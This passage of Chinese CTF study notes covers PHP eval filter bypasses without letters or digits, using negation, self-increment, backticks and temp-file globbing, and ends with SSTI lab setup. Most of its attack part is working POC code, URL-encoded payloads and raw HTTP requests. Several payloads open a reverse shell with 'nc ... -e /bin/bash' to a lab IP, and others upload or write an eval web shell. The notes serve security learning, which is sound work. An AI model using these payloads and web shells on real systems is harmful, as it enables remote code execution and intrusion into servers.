郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪
某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂
哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀
饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误
诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫
荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积
秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳
粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继
球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇
圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐
混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬
葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩
稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙
谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳
跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静
碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱
嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐
嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾
夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛
吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙
呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤
荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦
匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋
疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾
啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽
缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔
奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙
腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥
谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥
霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹
靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗";
function mb_str_split( $string ) {
    return preg_split('/(?<!^)(?!$)/u', $string );
}
foreach (mb_str_split($word) as $c)
{
    $arr[] = $c;
}

for ($x=0;$x<strlen($shell);$x++)
{
    for ($y=0;$y<count($arr);$y++)
    {
        $k = $arr[$y];
        if ($shell[$x] == ~($k{1}))
        {
            $result .= $k;
            $result1 .= "%".bin2hex($k{1});
            break;
        }
    }
}
echo "通过在URL内GET方法提交?cmd=\"具体命令\"";
echo "<br>";
echo "字符串：".$result;
echo "<br>";
echo "URL编码：".$result1;

```

### 反引号返回webshell

题目与`PHP 5.0`一样，但是由于反引号没有回显，所以无法直接读取文件

#### POC 代码

```php
<?php
$__ =  ~('%a0%af%b0%ac%ab');
$___ = $$__;
`$___[_]`;
```

#### payload

```
GET 传参：
cmd=$__ =  ~('%a0%af%b0%ac%ab');$___ = $$__;`$___[_]`;	

POST 传参：
_=nc 192.168.231.129 7777 -e /bin/bash
```

## 0x22. 无字母数字自增绕过

### 自增运算

在 PHP 中，自增运算符 `++` 可以用来将变量的值增加 1。它有两种形式：前自增和后自增。

- 前自增：`++$a`。它将 `$a` 的值加 1，然后返回 `$a`。
- 后自增：`$a++`。它返回 `$a` 的值，然后将 `$a` 的值加 1。

```php
<?php
echo "<h3>Postincrement</h3>";
$a = 5;
echo "Should be 5: " . $a++ . "<br />\n";
echo "Should be 6: " . $a . "<br />\n";

echo "<h3>Preincrement</h3>";
$a = 5;
echo "Should be 6: " . ++$a . "<br />\n";
echo "Should be 6: " . $a . "<br />\n";
?>
```

### 解题思路

如果我们获取了字符串`a`，那么就可以通过自增运算，获取所有想要的字符

```php
<?php
$a = 'a';
echo ++$a;

// 输出 b
```

此时的问题时如何获取到字符`a`呢？

通过在后面追加空字符串，使得类型变成`str`，再通过切片来获得想要的字符

```php
$a = [];
echo $a;

// 输出 Array

$a = [].'';
echo $a[0];

// 输出 A
```

### POC生成脚本

不准确，需要将结果再修改

```php
<?php
highlight_file(__FILE__);
$cmd = strtoupper($_GET['cmd']);
$cmd2 = strtoupper($_GET['post']);
function POC($cmd){
    $i = 0;
    $POC_pat1 = "\$__=\$___;";
    $POC_pat2 = "\$_ .=\$__;";
    while ($i<strlen($cmd)){
        $str1 = $cmd[$i];
        $POC1 = base_convert(bin2hex($str1),16,10)-base_convert(bin2hex("A"),16,10);
        if ($i<1) {
            $POC_pat3 = str_repeat("++\$__;",$POC1);
            echo $POC_pat3;
        }else{
            $str2 = $cmd[$i-1];
            if($str1==$str2){
                $POC_pat5 = $POC_pat2;
                echo $POC_pat5;
            }else{
                $POC_pat6 = $POC_pat1.str_repeat("++\$__;",$POC1).$POC_pat2;
                echo $POC_pat6;
            }
        }
        $i++;
    }
}

function POC2($cmd){
    $i = 0;
    echo '$____ = "_";$__=$___;';
    $POC_pat1 = "\$__=\$___;";
    $POC_pat2 = "\$____ .=\$__;";
    while ($i<strlen($cmd)){
        $str1 = $cmd[$i];
        $POC1 = base_convert(bin2hex($str1),16,10)-base_convert(bin2hex("A"),16,10);
        if ($i<1) {
            $POC_pat3 = str_repeat("++\$__;",$POC1).$POC_pat2;
            echo $POC_pat3;
        }else{
            $str2 = $cmd[$i-1];
            if($str1==$str2){
                $POC_pat5 = $POC_pat2;
                echo $POC_pat5;
            }else{
                $POC_pat6 = $POC_pat1.str_repeat("++\$__;",$POC1).$POC_pat2;
                echo $POC_pat6;
            }
        }
        $i++;
    }
}


if (!empty($cmd)){
    $POC_pat7 = "\$_=[].'';\$___=\$_[\$__];\$__=\$___;\$_=\$___;";
    echo $POC_pat7;
    POC($cmd);
}
if (!empty($cmd2)){
    POC2($cmd2);
}
```

### PHP 5.0 解题

#### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
}
```

#### POC 代码

```php
<?php
// ASSERT
$_=[].'';
$___=$_[$__];$__=$___;$_=$___;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;
// 
$____ = "_";
$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;
$__ = $$____;
$_($__[_____]);
```

#### payload

注意：GET传参需要使用URL编码

```
GET 传参：
%24_%3D%5B%5D.''%3B%0A%24___%3D%24_%5B%24__%5D%3B%24__%3D%24___%3B%24_%3D%24___%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%24_%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%0A%24____%20%3D%20%22_%22%3B%0A%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%0A%24__%20%3D%20%24%24____%3B%0A%24_(%24__%5B_____%5D)%3B

POST 传参
_____=system('cat flag')
```

![image-20230821215522215](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230821215522215.png)

### 反引号返回webshell

只需要构造出`_POST`，最后拼接命令即可

#### POC 代码

```php
$_=[].'';
$___=$_[$__];
$____ = "_";
$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;

$__ = $$____;
`$__[_]`;
```

#### payload

注意：GET传参需要使用URL编码，并且开启监听

```
GET 传参
%24_%3D%5B%5D.''%3B%0A%24___%3D%24_%5B%24__%5D%3B%0A%24____%20%3D%20%22_%22%3B%0A%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%0A%0A%24__%20%3D%20%24%24____%3B%0A%60%24__%5B_%5D%60%3B

POST 传参
_=nc 192.168.231.129 7777 -e /bin/bash
```

## 0x22. 无字母数字特殊符号过滤

### 无字母数字下划线绕过

#### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9_]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
}
```

#### 解题思路

`a-z 0-9`的过滤使用取反绕过的形式绕过，后续先闭合代码的标签，最后使用段标签执行命令

#### payload

```
?><?=`{${~"%a0%b8%ba%ab"}['%a0']}`?>&%a0=ls
```

1. `?>`：闭合题目中的PHP代码

2. `~"%a0%b8%ba%ab"`：取反计算结果为`_GET`

3. `${~"%a0%b8%ba%ab"}` = `${_POST}`，这种写法一般用于字符串中，不通过拼接的方式在字符串中输入变量

   1. ```php
      <?php
      $a = 'abc';
      echo "打印 ${a}";
      
      // 输出
      打印 abc
      ```

4. 代码拼接为`$_POST['%a0']`，最后使用反引号来执行命令

5. 由于这里使用的是段标签，所以反引号是会**回显**的

### 无字母数字下划线$

#### 前置知识

##### `call_user_func`

call_user_func — 把第一个参数作为回调函数调用

###### 说明

call_user_func ( [callable](language.types.callable.html) `$callback` [, [mixed](language.pseudo-types.html#language.types.mixed) `$parameter` [, [mixed](language.pseudo-types.html#language.types.mixed) `$...` ]] ) : [mixed](language.pseudo-types.html#language.types.mixed)

第一个参数 `callback` 是被调用的回调函数，其余参数是回调函数的参数。

###### 参数

- `callback`

  将被调用的回调函数（[callable](language.types.callable.html)）。

- `parameter`

  0个或以上的参数，被传入回调函数。

##### `(func)(parameter)`执行函数

PHP 可以使用`()()`的方式来执行函数

```php
<?php
(system)('dir');

// 输出
 Directory of D:\PHP

2023/08/21  22:59    <DIR>          .
2023/08/21  22:52    <DIR>          .idea
2021/11/18  16:34         1,804,192 Composer-Setup.exe
2023/06/19  21:18                32 flag.php
```

#### 解题过程

##### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9_$]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
}
```

##### payload

通过汇总前置知识，我们可以使用`(call_user_func)('system', 'ls')`的方式来执行命令

其中，为了绕过对于数字和字符的屏蔽，依然使用取反绕过

```
cmd=(~"%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c")(~"%8c%86%8c%8b%9a%92", ~"%9b%96%8d");
=====
cmd=(call_user)('system', 'dir');

也可以直接使用system函数来执行
cmd=(~"%8c%86%8c%8b%9a%92")(~"%9b%96%8d");
=======
(system)(dir)
```

### 无字母数字下划线及$符号过滤

#### 前置知识

##### 文件读取

PHP文件上传处理流程：

1. 将文件存储在临时文件夹中`/tmp`
2. 如果PHP中有使用函数`move_uploaded_file`来处理文件上传之后的存储路径，则将文件移动到该路径中
3. 若没有做后续处理，则删除临时文件

PHP文件上传命名规则：

+ 放置在临时文件夹中的文件名都会以这种格式命令：`phpxxxxxx`，绝对路径为：`/tmp/phpxxxxxx`

利用这一点，我们可以构造命令`./???/????????[@-[]`，因为全部用`?`匹配的话可能会出现匹配多个文件的情况，导致出错，所以最后一个字符使用正则来匹配，保证匹配到的最后一个字符为大写字母；

##### 修改数据包达到文件上传

**即使web站点没有上传口，我们也可以通过构造数据包的方式来上传文件**

数据包格式：

```
POST /class11/data.php HTTP/1.1
Host: 192.168.231.129:18082
Content-Length: 318
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.231.129:18082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKOHUn0Z6KIF1XE79
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.231.129:18082/class11/data.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryKOHUn0Z6KIF1XE79
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain

nc 192.168.231.129 7777 -e /bin/bash

------WebKitFormBoundaryKOHUn0Z6KIF1XE79
```

```
POST /test.php HTTP/1.1
Host: 192.168.231.1
Content-Length: 219
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.231.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAogMRaAr31PNx9sh
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.231.1/test.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


------WebKitFormBoundaryAogMRaAr31PNx9sh
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php eval($_POST['cmd']);?>

------WebKitFormBoundaryAogMRaAr31PNx9sh--
```

#### 解题流程

##### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9_$]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
}
```

#### 数据包构造

通过构造数据包来上传文件，然后通过命令`.+/???/????????[@-[]`来执行文件，执行之前先使用`?>`来闭合文件

```
GET 传参
`?><?=`.+/???/????????[@-[]`;?>`

URL 编码：这里很奇怪！URL编码的结果一定是下面这种字符串才能执行文件
?%3E%3C?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?%3E
```

将`<?php eval(\$_POST['cmd']);?>`写入服务器，并使用输出重定向移至当前路径下，重命名为`222.php`，

```
POST /class11/3.php?cmd=?%3E%3C?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?%3E HTTP/1.1
Host: 192.168.231.129:18082
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKOHUn0Z6KIF1XE79
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 223


------WebKitFormBoundaryKOHUn0Z6KIF1XE79
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain
echo "<?php eval(\$_POST['cmd']);?>" > ./222.php
------WebKitFormBoundaryKOHUn0Z6KIF1XE79
```

# SSTI 模板注入

## 0x00 SSTI  靶场搭建

```bash
# 下载镜像
┌──(pinginglab㉿pinginglab)-[~]
└─$ docker pull mcc0624/flask_ssti:last

# 运行靶场
┌──(root㉿pinginglab)-[/opt/flask1]
└─# docker run -p 18022:22 -p 18080:80 -i -t mcc0624/flask_ssti:last bash -c '/etc/re.local; /bin/bash'
```

## 0x01 Python Venv 环境安装介绍

python Venv 相当于在Kali中安装一个专属于Python工作的虚拟机，可以把他想象成一个容器，该容器供你用来存放你的Python脚本以及安装各种Python第三方模块，容器里的环境和本机是完全分开的

### 1. 安装venv

```bash
# 先查看python的版本信息
┌──(root㉿pinginglab)-[/opt/flask1]
└─# python --version
Python 3.11.4

# 更新软件库
┌──(root㉿pinginglab)-[/opt/flask1]
└─# apt update

# 安装venv；由于Kali中的Python版本号是 3.11.4，所以这里的venv也下载 3.11 版本
┌──(root㉿pinginglab)-[/opt/flask1]
└─# apt install python3.11-venv
```

### 2. 创建venv环境安装flask

```bash
┌──(root㉿pinginglab)-[/opt/flask1]
└─# cd /opt  
 
 # 创建虚拟环境
┌──(root㉿pinginglab)-[/opt]
└─# python3 -m venv flask1
```

### 3. 执行flask1路径下的Python

```bash
#-------------方法一--------------
# 使用绝对路径
┌──(root㉿pinginglab)-[/opt]
└─# /opt/flask1/bin/python demo.py

# ------------方法二-------------
# 进入虚拟环境
┌──(root㉿pinginglab)-[/opt]
└─# cd /opt/flask1 
    
┌──(root㉿pinginglab)-[/opt/flask1]
└─# source ./bin/activate

